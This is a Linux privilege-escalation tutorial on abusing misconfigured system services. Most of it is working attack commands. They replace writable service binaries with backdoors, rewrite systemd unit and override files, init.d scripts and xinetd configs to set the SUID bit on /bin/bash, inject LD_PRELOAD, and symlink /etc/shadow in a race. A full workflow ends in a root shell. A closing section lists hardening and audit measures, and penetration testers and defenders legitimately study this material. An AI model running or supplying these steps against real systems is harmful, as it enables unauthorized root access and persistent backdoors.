## Service Misconfigurations for Privilege Escalation

Service misconfigurations are a prime privilege escalation vector where **system services running as root** have insecure configurations, writable binaries, or dangerous settings. Unlike cron jobs, services are constantly running and can be triggered immediately.

---

### 1. Understanding Service Misconfigurations

**What Are System Services?**
- Background processes that start at boot or on-demand
- Run under specific users (often root or system users)
- Controlled by init systems (System V init, Upstart, Systemd)
- Typically found in `/etc/init.d/`, `/etc/systemd/system/`, `/etc/xinetd.d/`

**Why They're Dangerous**:
- Services run with **root privileges**
- They're **constantly running** (no need to wait for cron)
- Misconfigurations are **persistent** across reboots
- Often overlooked in security audits

---

### 2. Enumeration: Finding Vulnerable Services

**List All Running Services**:
```bash
# Systemd services
systemctl list-units --type=service --state=running
systemctl list-units --type=service --all

# SysV init services
service --status-all
ls -la /etc/init.d/

# Upstart services (older systems)
initctl list
```

**Check Service Permissions**:
```bash
# Find writable service files
find /etc/systemd/system -name "*.service" -writable 2>/dev/null
find /lib/systemd/system -name "*.service" -writable 2>/dev/null
find /etc/init.d -type f -writable 2>/dev/null
find /etc/xinetd.d -type f -writable 2>/dev/null

# Check configuration directories
ls -la /etc/systemd/system/
ls -la /etc/init.d/
```

**Check Service Binaries**:
```bash
# Find services using writable binaries
for service in $(systemctl list-units --type=service --state=running --no-legend | awk '{print $1}'); do
    binary=$(systemctl show $service -p ExecStart --no-pager | cut -d= -f2 | awk '{print $1}')
    if [ -f "$binary" ] && [ -w "$binary" ]; then
        echo "[!] Writable binary: $binary (service: $service)"
    fi
done
```

**Check Service Configuration**:
```bash
# Look for dangerous options
grep -r "ExecStart" /etc/systemd/system/*.service 2>/dev/null | grep -v "/usr/bin\|/bin/"

# Check for insecure permissions
find /etc -name "*.conf" -exec ls -la {} \; 2>/dev/null | grep -v root
```

**Automated Tools**:
```bash
# LinPEAS service checks
./linpeas.sh | grep -A 10 "Services"

# Manual comprehensive check
for service in $(systemctl list-units --type=service --state=running --no-legend | awk '{print $1}'); do
    echo "=== $service ==="
    systemctl show $service -p ExecStart,User,Group,ProtectSystem,PrivateTmp
done
```

---

### 3. Writable Service Binaries

If a service's binary is writable, replace it with a malicious version.

**Exploitation**:
```bash
# 1. Find writable service binaries
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -writable -exec ls -la {} \; 2>/dev/null

# 2. Identify which service uses it
for binary in $(find /usr/bin /usr/sbin -type f -writable 2>/dev/null); do
    echo "=== $binary ==="
    grep -r "$binary" /etc/systemd/system/ /etc/init.d/ 2>/dev/null | head -5
done

# 3. Create malicious replacement
cat > /tmp/malicious_binary << 'EOF'
#!/bin/bash
# Execute backdoor
cp /bin/bash /tmp/shell
chmod +s /tmp/shell
# Execute real binary to maintain service functionality
/usr/bin/real_binary "$@"
EOF
chmod +x /tmp/malicious_binary

# 4. Replace the binary (if writable)
cp /tmp/malicious_binary /usr/bin/vulnerable_service

# 5. Restart service or wait for next execution
systemctl restart vulnerable_service
# OR kill -9 <PID> and let systemd restart it
```

**Example - Apache with Writable Binary**:
```bash
# /usr/sbin/apache2 is world-writable
cp /tmp/backdoor /usr/sbin/apache2
systemctl restart apache2
# /tmp/shell becomes SUID root
```

---

### 4. Writable Service Configuration Files

#### A. Systemd Unit Files

**Exploitation - Modify ExecStart**:
```bash
# 1. Find writable service file
find /etc/systemd/system -name "*.service" -writable 2>/dev/null

# 2. Edit service file
vim /etc/systemd/system/backup.service
# Change ExecStart to:
ExecStart=/bin/bash -c 'chmod +s /bin/bash && /usr/bin/real_backup'

# 3. Reload and restart
systemctl daemon-reload
systemctl restart backup.service
```

**Exploitation - Add ExecStartPre**:
```bash
# Add pre-execution command
cat >> /etc/systemd/system/mysql.service << 'EOF'
ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
EOF

systemctl daemon-reload
systemctl restart mysql
```

**Exploitation - Override Files**:
```bash
# Create override directory
mkdir /etc/systemd/system/mysql.service.d/

# Create override file
cat > /etc/systemd/system/mysql.service.d/override.conf << 'EOF'
[Service]
ExecStart=
ExecStart=/bin/bash -c 'chmod +s /bin/bash && /usr/sbin/mysqld'
EOF

systemctl daemon-reload
systemctl restart mysql
```

**Exploitation - Environment Variables**:
```bash
# Add environment variable to service
cat >> /etc/systemd/system/service.service << 'EOF'
[Service]
Environment="LD_PRELOAD=/tmp/backdoor.so"
EOF

systemctl daemon-reload
systemctl restart service
```

---

#### B. Init Scripts (/etc/init.d/)

**Exploitation**:
```bash
# 1. Find writable init scripts
find /etc/init.d -type f -writable 2>/dev/null

# 2. Modify the script
vim /etc/init.d/backup
# Add at the beginning:
chmod +s /bin/bash

# 3. Restart service
service backup restart
# OR
/etc/init.d/backup restart
```

**Example Injection**:
```bash
# Original script
#!/bin/sh
# /etc/init.d/backup
case "$1" in
  start)
    /usr/local/bin/backup.sh
    ;;

# Modified script
#!/bin/sh
chmod +s /bin/bash
case "$1" in
  start)
    /usr/local/bin/backup.sh
    ;;
```

---

#### C. xinetd Services (/etc/xinetd.d/)

**Exploitation**:
```bash
# 1. Find writable xinetd configuration
find /etc/xinetd.d -type f -writable 2>/dev/null

# 2. Modify service
vim /etc/xinetd.d/tftp
# Add or modify:
server = /bin/bash
server_args = -c 'chmod +s /bin/bash && /usr/sbin/in.tftpd'

# 3. Restart xinetd
systemctl restart xinetd
# OR
service xinetd restart
```

---

### 5. Service User Misconfigurations

#### A. Service Running as Root

**Check Service User**:
```bash
# Systemd
systemctl show service_name -p User
systemctl show service_name -p Group

# SysV
ps aux | grep service_name
# Check the user column
```

**Exploitation - Writable Service Directories**:
```bash
# If a root service writes to a directory you own
# Example: /var/log/service/ is owned by user
echo '#!/bin/bash
chmod +s /bin/bash' > /var/log/service/script.sh
# Service executes everything in that directory
```

---

#### B. Service with Sudo Permissions

Some services are configured to run with sudo without password.

**Exploitation**:
```bash
# Check sudo -l for service commands
sudo -l | grep -i service

# Example: user can run service command as root
sudo /usr/sbin/service apache2 restart
# If you can modify apache2 service configuration
# Create malicious init script
```

---

### 6. Dangerous Service Options

#### A. Systemd's `ProtectSystem` and `PrivateTmp`

If these are set to `false` or `off`, services can write to system directories.

**Exploitation**:
```bash
# Check service settings
systemctl show service_name -p ProtectSystem -p PrivateTmp

# If ProtectSystem=off, the service can write to /etc, /usr, etc.
# If PrivateTmp=off, the service shares /tmp with other processes
```

#### B. Systemd's `RootDirectory` / `RootImage`

If a service runs in a container/chroot, escaping is possible.

**Exploitation**:
```bash
# Check if service uses chroot
systemctl show service_name -p RootDirectory

# If set to a writable directory, you can modify the chroot
```

#### C. Systemd's `BindReadOnlyPaths` / `BindPaths`

If a service mounts directories, you might be able to write to them.

**Exploitation**:
```bash
# Check mounts
systemctl show service_name -p BindReadOnlyPaths -p BindPaths

# If /etc is mounted read-write, you can modify system files
```

---

### 7. Service File Inclusion/Import

Some services include other configuration files or scripts.

**Exploitation**:
```bash
# 1. Find services that include files
grep -r "Include\|Import\|Source" /etc/systemd/system/*.service 2>/dev/null
grep -r "\. " /etc/init.d/* 2>/dev/null

# 2. If included directory is writable
# Example: service includes /etc/service.d/*.conf
# And /etc/service.d/ is writable

# 3. Create malicious config
echo '#!/bin/bash
chmod +s /bin/bash' > /etc/service.d/backdoor.conf

# 4. Restart service
systemctl restart service
```

---

### 8. Service Dependencies

Services can have dependencies that execute when they start/stop.

**Exploitation**:
```bash
# 1. Check service dependencies
systemctl list-dependencies service_name

# 2. Find writable dependency
find /etc/systemd/system -name "*.service" -writable | grep -E "dependency|target"

# 3. Modify dependency to include backdoor
# Wait for original service to start/restart
```

---

### 9. Inetd / Xinetd Wrapper Scripts

**Exploitation**:
```bash
# 1. Find wrapper scripts in xinetd configs
grep -r "server" /etc/xinetd.d/* | grep -v "/usr\|/bin\|/sbin"

# 2. If wrapper script is writable
vim /etc/xinetd.d/myservice
# Contains: server = /usr/local/bin/myservice_wrapper

# 3. Modify wrapper
echo '#!/bin/bash
chmod +s /bin/bash
/usr/bin/real_service' > /usr/local/bin/myservice_wrapper
chmod +x /usr/local/bin/myservice_wrapper

# 4. Connect to service to trigger
nc localhost <port>
```

---

### 10. Service Socket Activation

Systemd socket-activated services start on demand when a connection is received.

**Exploitation**:
```bash
# 1. Find socket-activated services
systemctl list-units --type=socket --state=running

# 2. Check service and socket configuration
systemctl cat service_name.socket
systemctl cat service_name.service

# 3. If service file is writable, modify it
# 4. Restart socket
systemctl restart service_name.socket

# 5. Trigger by connecting to socket
nc localhost <port>
```

---

### 11. Service Temporary Files

Services often create temporary files in `/tmp` or `/var/tmp`.

**Exploitation**:
```bash
# 1. Monitor service's temporary file creation
strace -e openat -p <service_pid> 2>&1 | grep -E "/tmp|/var/tmp"

# 2. Create symlink to sensitive file
ln -s /etc/shadow /tmp/service_temp_file

# 3. Wait for service to write to it (TOCTOU)
# If service is root, it overwrites /etc/shadow
```

---

### 12. Practical Exploitation Workflow

**Step 1: Enumerate Services**:
```bash
# All running services
systemctl list-units --type=service --state=running --no-legend

# Check each service's configuration
for service in $(systemctl list-units --type=service --state=running --no-legend | awk '{print $1}'); do
    echo "=== $service ==="
    systemctl cat $service 2>/dev/null | head -20
    echo
done
```

**Step 2: Check Permissions**:
```bash
# Check service files
find /etc/systemd/system /lib/systemd/system -name "*.service" -writable 2>/dev/null
find /etc/init.d -type f -writable 2>/dev/null

# Check service binaries
for service in $(systemctl list-units --type=service --state=running --no-legend | awk '{print $1}'); do
    binary=$(systemctl show $service -p ExecStart --no-pager 2>/dev/null | cut -d= -f2 | awk '{print $1}')
    if [ -n "$binary" ] && [ -f "$binary" ] && [ -w "$binary" ]; then
        echo "[!] Writable binary: $binary ($service)"
    fi
done
```

**Step 3: Identify Best Target**:
```bash
# Look for services that:
# 1. Run as root (User=root)
# 2. Have writable configuration files
# 3. Have writable binaries
# 4. Have dangerous options
# 5. Are commonly used and unlikely to be removed
```

**Step 4: Create Exploit**:
```bash
# Option A: Modify service file
vim /etc/systemd/system/target.service
# Add: ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'

# Option B: Replace binary
cp /tmp/backdoor /usr/bin/target_binary

# Option C: Environment variable
cat > /etc/systemd/system/target.service.d/override.conf << 'EOF'
[Service]
Environment="LD_PRELOAD=/tmp/backdoor.so"
EOF
```

**Step 5: Trigger Execution**:
```bash
# Systemd
systemctl daemon-reload
systemctl restart target_service

# SysV
service target_service restart

# xinetd
systemctl restart xinetd
# Then connect to the port
```

**Step 6: Verify**:
```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root ...
/bin/bash -p
# root shell
```

---

### 13. Defensive Measures

**For System Administrators**:

1. **Restrict Service File Permissions**:
   ```bash
   # Protect systemd service files
   chmod 644 /etc/systemd/system/*.service
   chown root:root /etc/systemd/system/*.service
   
   # Protect init scripts
   chmod 755 /etc/init.d/*
   chown root:root /etc/init.d/*
   ```

2. **Use Systemd Security Features**:
   ```bash
   # In service file:
   [Service]
   User=nobody
   Group=nogroup
   ProtectSystem=strict
   PrivateTmp=yes
   NoNewPrivileges=yes
   PrivateDevices=yes
   ProtectHome=yes
   ProtectKernelTunables=yes
   ProtectKernelModules=yes
   ProtectControlGroups=yes
   RestrictRealtime=yes
   ```

3. **Minimize Root Services**:
   ```bash
   # Run services as non-root users
   User=www-data
   Group=www-data
   # Only grant necessary capabilities
   AmbientCapabilities=CAP_NET_BIND_SERVICE
   CapabilityBoundingSet=CAP_NET_BIND_SERVICE
   ```

4. **Use Read-Only Filesystems**:
   ```bash
   # Mount /usr as read-only
   mount -o remount,ro /usr
   # Or use overlayfs for writable layers
   ```

5. **Monitor Service Changes**:
   ```bash
   # Audit service file changes
   auditctl -w /etc/systemd/system/ -p wa -k systemd_changes
   auditctl -w /etc/init.d/ -p wa -k init_changes
   
   # Check service file integrity
   for file in /etc/systemd/system/*.service; do
       sha256sum "$file" >> /var/log/service_checksums
   done
   ```

6. **Regular Audits**:
   ```bash
   # Check for writable service files daily
   find /etc/systemd/system /lib/systemd/system /etc/init.d -type f -writable ! -user root 2>/dev/null
   
   # Check service binaries
   for service in $(systemctl list-units --type=service --state=running --no-legend | awk '{print $1}'); do
       binary=$(systemctl show $service -p ExecStart --no-pager | cut -d= -f2 | awk '{print $1}')
       if [ -f "$binary" ] && [ ! -O "$binary" ]; then
           echo "Warning: $binary not owned by root"
       fi
   done
   ```

7. **Use AppArmor/SELinux**:
   ```bash
   # Restrict service capabilities
   # Create profiles for critical services
   aa-enforce /etc/apparmor.d/usr.sbin.mysqld
   ```

8. **Service Hardening Checklist**:
   - [ ] All service files owned by root:root
   - [ ] Service files not writable by group/others (chmod 644)
   - [ ] Services run as least-privileged user
   - [ ] ProtectSystem and PrivateTmp enabled
   - [ ] NoNewPrivileges enabled
   - [ ] Proper CapabilityBoundingSet
   - [ ] Read-only filesystems where possible
   - [ ] Regular integrity checks
